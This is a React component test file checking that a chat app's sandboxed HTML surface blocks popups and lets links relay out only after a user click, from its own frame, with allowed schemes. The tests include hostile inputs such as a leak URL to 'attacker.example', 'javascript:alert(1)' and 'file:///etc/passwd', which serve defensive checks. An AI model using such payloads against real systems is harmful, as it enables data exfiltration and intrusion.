import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test";
import { cleanup, render } from "@testing-library/react";
import { renderToStaticMarkup } from "react-dom/server";

import type { Surface } from "@/domains/chat/types/types";

mock.module("@/utils/app-html-cache", () => ({
  getCachedAppHtml: () => Promise.resolve("<html></html>"),
  clearAppHtmlCache: () => {},
}));

mock.module("@/stores/pinned-apps-store", () => {
  const emptyStore = {
    use: {
      pinnedApps: () => [],
      pinnedAppIds: () => new Set<string>(),
      togglePin: () => () => {},
      isPinned: () => () => false,
      onUnpin: () => () => () => {},
    },
    getState: () => ({
      pinnedApps: [],
      pinnedAppIds: new Set<string>(),
      togglePin: () => {},
      isPinned: () => false,
      onUnpin: () => () => {},
    }),
  };
  return { usePinnedAppsStore: emptyStore };
});

import { DynamicPageSurface } from "@/domains/chat/components/surfaces/dynamic-page-surface";

function surface(data: Record<string, unknown>): Surface {
  return {
    surfaceId: "surface-123",
    surfaceType: "dynamic_page",
    title: "Surface title",
    data,
  };
}

function isOpenAppEnabled(html: string): boolean {
  const openAppMatch = html.match(
    /<button[^>]*>(?:<[^>]*>)*Open App<\/button>/,
  );
  if (!openAppMatch) return false;
  return !openAppMatch[0].includes('disabled=""');
}

describe("DynamicPageSurface", () => {
  test("enables preview open when inline HTML exists without a persisted app id", () => {
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({
          html: "<html><body>Hello</body></html>",
          preview: { title: "Hello, World" },
        })}
        onAction={() => undefined}
      />,
    );

    expect(rendered).toContain("Open App");
    expect(isOpenAppEnabled(rendered)).toBe(true);
  });

  test("keeps preview open disabled when there is no app id or inline HTML", () => {
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({
          html: "",
          preview: { title: "Hello, World" },
        })}
        onAction={() => undefined}
      />,
    );

    expect(rendered).toContain("Open App");
    expect(isOpenAppEnabled(rendered)).toBe(false);
  });

  test("opens snake_case persisted app ids through the app viewer", () => {
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({
          app_id: " app-123 ",
          html: "<html></html>",
          preview: { title: "Hello, World" },
        })}
        onAction={() => undefined}
        onOpenApp={() => undefined}
      />,
    );

    expect(rendered).toContain("Open App");
    expect(isOpenAppEnabled(rendered)).toBe(true);
  });

  test("keeps app cards disabled while the originating tool call is still running", () => {
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={{
          ...surface({
            app_id: "app-123",
            html: "<html><body>Scaffold</body></html>",
            preview: { title: "Hello, World", icon: "🚀" },
          }),
          toolCallId: "tc-app",
        }}
        onAction={() => undefined}
        onOpenApp={() => undefined}
        toolCalls={[{ id: "tc-app", name: "app_create", input: {} }]}
      />,
    );

    expect(rendered).toContain("Open App");
    expect(isOpenAppEnabled(rendered)).toBe(false);
  });

  test("keeps app cards disabled while the latest surface tool runs without an explicit link", () => {
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({
          app_id: "app-123",
          html: "<html><body>Scaffold</body></html>",
          preview: { title: "Hello, World", icon: "🚀" },
        })}
        onAction={() => undefined}
        onOpenApp={() => undefined}
        toolCalls={[{ id: "tc-app", name: "app_create", input: {} }]}
      />,
    );

    expect(rendered).toContain("Open App");
    expect(isOpenAppEnabled(rendered)).toBe(false);
  });

  test("sandboxes the inline frame without popup tokens (ATL-1197)", () => {
    // No preview → the srcdoc iframe renders directly.
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({ html: "<div>widget</div>" })}
        onAction={() => undefined}
      />,
    );

    expect(rendered).toContain("<iframe");
    expect(rendered).toContain('sandbox="allow-scripts"');
    expect(rendered).not.toContain("allow-same-origin");
    // A popup is a top-level navigation that the embedder's `frame-src`
    // cannot constrain, so it would be an egress channel out of a document
    // that is otherwise denied all network access.
    expect(rendered).not.toContain("allow-popups");
    expect(rendered).toContain('referrerPolicy="no-referrer"');
  });

  test("injects the relaying link interceptor into the srcdoc", () => {
    // The frame has no popup tokens, so an in-frame `window.open` is a
    // silent no-op — external links must relay to the host instead.
    const rendered = renderToStaticMarkup(
      <DynamicPageSurface
        surface={surface({ html: "<div>widget</div>" })}
        onAction={() => undefined}
      />,
    );

    expect(rendered).toContain("vellum_open_link");
    expect(rendered).not.toContain("window.open(rawHref");
  });
});

describe("DynamicPageSurface link relay", () => {
  const originalOpen = window.open;
  let opened: string[];

  /** Mount the surface and hand back its frame, so a relayed message can
   *  carry the `source` the parent checks. */
  function mountFrame(): HTMLIFrameElement {
    const { container } = render(
      <DynamicPageSurface
        surface={surface({ html: "<div>widget</div>" })}
        onAction={() => undefined}
      />,
    );
    const frame = container.querySelector("iframe");
    if (!frame) {
      throw new Error("expected the dynamic page surface to render a frame");
    }
    return frame;
  }

  function relayLink(frame: HTMLIFrameElement, href: unknown): void {
    const event = new MessageEvent("message", {
      data: { type: "vellum_open_link", frameId: "surface-123", href },
    });
    // `source` is readonly on the constructed event, and happy-dom does not
    // honour it from the init dict.
    Object.defineProperty(event, "source", { value: frame.contentWindow });
    window.dispatchEvent(event);
  }

  function setUserActivation(isActive: boolean): void {
    Object.defineProperty(navigator, "userActivation", {
      value: { isActive, hasBeenActive: isActive },
      configurable: true,
    });
  }

  beforeEach(() => {
    opened = [];
    window.open = ((url?: string | URL) => {
      opened.push(String(url));
      return null;
    }) as typeof window.open;
    setUserActivation(true);
  });

  afterEach(() => {
    window.open = originalOpen;
    cleanup();
  });

  test("opens a relayed external link on the host", () => {
    const frame = mountFrame();

    relayLink(frame, "https://example.com/docs");

    // The host opens it, so Electron and Capacitor route it through their
    // own external-browser handling instead of the sandbox opening it raw.
    expect(opened).toEqual(["https://example.com/docs"]);
  });

  test("ignores a relay with no user activation", () => {
    // A widget reads its own frameId and can post on load or in a loop, so
    // the click is the only thing separating a link the user asked for from
    // markup phoning home.
    const frame = mountFrame();
    setUserActivation(false);

    relayLink(frame, "https://attacker.example/leak?d=secret");

    expect(opened).toEqual([]);
  });

  test("refuses schemes outside the link allowlist", () => {
    const frame = mountFrame();

    for (const href of [
      "javascript:alert(1)",
      "data:text/html,<script>x</script>",
      "file:///etc/passwd",
      "blob:https://example.com/abc",
    ]) {
      relayLink(frame, href);
    }

    expect(opened).toEqual([]);
  });

  test("ignores a relay from anything but its own frame", () => {
    const frame = mountFrame();
    const event = new MessageEvent("message", {
      data: {
        type: "vellum_open_link",
        frameId: "surface-123",
        href: "https://attacker.example/leak",
      },
    });
    Object.defineProperty(event, "source", { value: window });
    window.dispatchEvent(event);

    expect(opened).toEqual([]);
    expect(frame).toBeTruthy();
  });
});
